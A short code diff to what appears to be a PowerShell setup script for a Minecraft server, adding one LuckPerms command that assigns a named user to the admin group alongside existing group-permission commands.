@@ -81,7 +81,8 @@ try {
                 "lp group admin permission set larpers.chat.bypass true",
                 "lp group admin permission set larpers.anticheat.bypass true",
                 "lp creategroup fondateur",
-                "lp group fondateur parent add admin"
+                "lp group fondateur parent add admin",
+                "lp user 12felix122 parent set admin"
             )
             foreach ($command in $luckPermsCommands) {
                 try {
